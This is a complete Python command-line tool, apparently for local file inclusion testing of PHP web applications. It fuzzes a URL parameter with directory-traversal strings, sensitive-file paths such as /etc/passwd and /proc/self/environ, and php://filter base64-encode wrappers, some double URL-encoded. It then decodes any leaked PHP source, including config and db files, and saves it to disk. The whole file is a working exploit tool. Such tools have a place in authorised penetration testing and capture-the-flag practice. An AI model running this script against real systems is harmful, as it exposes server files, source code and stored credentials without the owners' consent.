#!/usr/bin/env python3
import argparse, base64, hashlib, os, re, sys, time
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
import requests

requests.packages.urllib3.disable_warnings()

def sha1(b): return hashlib.sha1(b).hexdigest()

def set_query(url, key, val):
    u = urlsplit(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q[key] = val
    return urlunsplit((u.scheme, u.netloc, u.path, urlencode(q, doseq=True), u.fragment))

def get(url, timeout, headers):
    try:
        r = requests.get(url, timeout=timeout, verify=False, headers=headers)
        return r.status_code, r.headers, r.content
    except Exception as e:
        return 0, {}, f"[error] {e}".encode()

def is_base64_blob(s: bytes) -> bool:
    if len(s) < 200: return False
    t = s.strip()
    if b'<' in t and b'>' in t: return False
    return re.fullmatch(br'[A-Za-z0-9+/=\s]+', t) is not None

def looks_like_source(decoded: bytes) -> bool:
    sniff = decoded[:2048]
    return any(sig in sniff for sig in (b'<?php', b'function ', b'namespace ', b'include', b'require'))

def clean_name(s: str) -> str:
    return re.sub(r'[^A-Za-z0-9_.-]+', '_', s)[:120]

def classify(template_len, template_hash, code, body_len, body_hash):
    if code == 0: return "ERROR"
    if body_hash == template_hash: return "TEMPLATE"
    if abs(body_len - template_len) <= 20: return "UNKNOWN"
    return "DELTA"

def build_candidates(seed_names):
    # raw
    for n in seed_names:
        yield n
    # traversal
    for n in seed_names:
        for d in range(1, 6):
            yield "../" * d + n
    # sensitive paths
    for s in [
        "/etc/passwd", "/etc/hosts", "/proc/self/environ", "/etc/issue",
        "C:/Windows/win.ini", "C:/Windows/System32/drivers/etc/hosts", "Windows/win.ini",
    ]:
        yield s
    # php://filter (assume app appends .php → omit extension and prefix ./)
    targets = list({t.replace(".php", "") for t in seed_names if t.endswith(".php")} |
                   {"index","home","archive","login","config","db","includes/config","config/config"})
    variants = [
        "php://filter/convert.base64-encode/resource=./{T}",
        "PHP://filter/convert.base64-encode/resource=./{T}",
        "php://filter/string.strip_tags|convert.base64-encode/resource=./{T}",
        "php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253D.%252F{T}",
    ]
    for t in targets:
        for v in variants: yield v.format(T=t)
    # behavior probes
    yield "data://text/plain,hello"
    yield "php://input"

def main():
    ap = argparse.ArgumentParser(description="Readable LFI/LFD/Wrapper tester")
    ap.add_argument("url", help="Target URL with parameter (e.g., http://host/?op=home)")
    ap.add_argument("-p","--param", default="op", help="Parameter to fuzz (default: op)")
    ap.add_argument("-t","--timeout", type=float, default=8.0, help="HTTP timeout seconds")
    ap.add_argument("-H","--header", action="append", help="Extra header, e.g. 'Cookie: PHPSESSID=abc'")
    ap.add_argument("-o","--outdir", default="evidence", help="Save interesting responses here")
    ap.add_argument("--list", action="store_true", help="Also print clean URLs (one per line) as they are tested")
    ap.add_argument("-v","--verbose", action="store_true", help="Verbose")
    args = ap.parse_args()

    headers = {}
    if args.header:
        for h in args.header:
            k, _, v = h.partition(":")
            headers[k.strip()] = v.strip()

    # Baseline on the provided page as-is
    c0, h0, b0 = get(args.url, args.timeout, headers)
    base_hash, base_len = sha1(b0), len(b0)
    print(f"[baseline] code={c0} len={base_len} hash={base_hash}")

    # Template reference: hit with a definitely-nonexistent value to capture 404/placeholder
    tmpl_url = set_query(args.url, args.param, "___no_such_page___")
    ct, ht, bt = get(tmpl_url, args.timeout, headers)
    template_hash, template_len = sha1(bt), len(bt)
    if args.verbose:
        print(f"[template] code={ct} len={template_len} hash={template_hash} url={tmpl_url}")

    # Seed names
    u = urlsplit(args.url)
    params = dict(parse_qsl(u.query, keep_blank_values=True))
    seed = []
    if args.param in params and params[args.param]:
        seed.append(params[args.param])
    seed += ["home","archive","login","index","config","db",
             "home.php","archive.php","login.php","index.php","config.php","db.php"]

    tried, hits = set(), 0
    for val in build_candidates(seed):
        url = set_query(args.url, args.param, val)
        if url in tried:
            continue
        tried.add(url)

        code, hdr, body = get(url, args.timeout, headers)
        bh = sha1(body)
        bl = len(body)
        verdict = classify(template_len, template_hash, code, bl, bh)

        if args.list:
            print(url)

        # Print crisp one-line status
        print(f"[{verdict:<9}] {url}  [{code}]  body={bl}")

        # Auto-decode php://filter base64 hits
        if verdict in ("DELTA","UNKNOWN") and is_base64_blob(body):
            try:
                decoded = base64.b64decode(body, validate=False)
                if looks_like_source(decoded):
                    hits += 1
                    base = clean_name(val)
                    raw_path = os.path.join(args.outdir, f"{int(time.time())}_{base}.b64.txt")
                    dec_path = os.path.join(args.outdir, f"{int(time.time())}_{base}.decoded.txt")
                    os.makedirs(args.outdir, exist_ok=True)
                    with open(raw_path,"wb") as f: f.write(body)
                    with open(dec_path,"wb") as f: f.write(decoded)
                    print(f"[DECODE   ] -> {dec_path}")
                else:
                    if args.verbose:
                        print("[note] base64-looking body did not resemble source code")
            except Exception as e:
                if args.verbose:
                    print(f"[decode! ] error: {e}")

        # Save small custom error pages or big deltas
        if verdict == "DELTA" or (200 <= code < 300 and bl < 400):
            hits += 1
            base = clean_name(val)
            path = os.path.join(args.outdir, f"{int(time.time())}_{base}.txt")
            os.makedirs(args.outdir, exist_ok=True)
            with open(path,"wb") as f: f.write(body)
            if args.verbose:
                print(f"[SAVE     ] -> {path}")

    print(f"\nDone. Interesting responses saved: {hits} -> {args.outdir}")

if __name__ == "__main__":
    main()
